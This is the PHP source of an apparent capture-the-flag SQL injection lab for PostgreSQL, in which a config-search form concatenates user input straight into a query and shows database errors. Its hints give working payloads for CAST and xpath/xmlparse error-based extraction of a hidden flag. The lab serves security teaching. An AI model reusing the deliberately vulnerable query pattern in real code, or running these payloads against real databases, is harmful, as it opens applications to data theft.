<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    $res = pg_query($conn, "SELECT flag_value FROM hidden_flags LIMIT 1");
    $row = pg_fetch_assoc($res);

    if ($row && $submitted === $row['flag_value']) {
        $_SESSION['pgsql_lab13_solved'] = true;
        header("Location: " . url_lab_from_slug("pgsql/lab13", $mode, $_GET['ref'] ?? ''));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 13. XML Injection: xmlparse / xpath</h3>

    <h4>Scenario</h4>
    <p>
        A configuration viewer application displays system configuration key-value pairs.
        Users can search for configuration keys. The input is concatenated directly into
        the SQL query without sanitization.
    </p>
    <p>
        A hidden <code>hidden_flags</code> table contains a flag value. PostgreSQL has
        built-in XML support with <code>xmlparse()</code> and <code>xpath()</code> functions
        that can be leveraged for data extraction. For this lab, extract the flag using
        <strong>CAST error-based extraction</strong> or <strong>xpath error techniques</strong>.
        The solution explains both approaches.
    </p>

    <h4>Objective</h4>
    <p>
        Extract the <strong>flag_value</strong> from the <code>hidden_flags</code> table.
        Submit it below to solve the lab.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Try searching for <code>app</code>: does it show config entries?<br>
        2. Test injection: <code>app' AND 1=1 -- -</code><br>
        3. CAST error extraction: <code>' AND 1=CAST((SELECT flag_value FROM hidden_flags LIMIT 1) AS INTEGER) -- -</code><br>
        4. XML-based extraction: <code>' AND 1=CAST(xpath('/x', xmlparse(document '&lt;x&gt;'||(SELECT flag_value FROM hidden_flags LIMIT 1)||'&lt;/x&gt;'))::text AS INTEGER) -- -</code><br>
        5. The error output contains the flag value embedded in the XML or CAST error message
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
<input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['pgsql_lab13_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the flag using XML/xpath-based techniques in PostgreSQL.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Config Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="key" class="input" placeholder="Search config keys (try: app)" value="<?= htmlspecialchars($_POST['key'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['key'])) {
    $key = $_POST['key'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT id, config_key, config_value FROM configs WHERE config_key ILIKE '%$key%'";

    // Show the executed query
    echo '<div class="terminal query-output">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">PostgreSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">pgsql&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute query
    $result = @pg_query($conn, $query);

    if ($result && pg_num_rows($result) > 0) {
        echo '<div class="result-data result-box">';
        echo '<table class="result-table"><tr><th>ID</th><th>Key</th><th>Value</th></tr>';
        while ($row = pg_fetch_assoc($result)) {
            echo '<tr>';
            echo '<td>' . htmlspecialchars($row['id'] ?? '') . '</td>';
            echo '<td>' . htmlspecialchars($row['config_key'] ?? '') . '</td>';
            echo '<td>' . htmlspecialchars($row['config_value'] ?? '') . '</td>';
            echo '</tr>';
        }
        echo '</table></div>';
    } elseif ($result) {
        echo '<div class="result-warning result-box">No configuration entries found matching your search.</div>';
    } else {
        $err = pg_last_error($conn);
        echo '<div class="result-error result-box"><strong>Query Error:</strong> ' . htmlspecialchars($err) . '</div>';
    }
}
?>

<?php endif; ?>
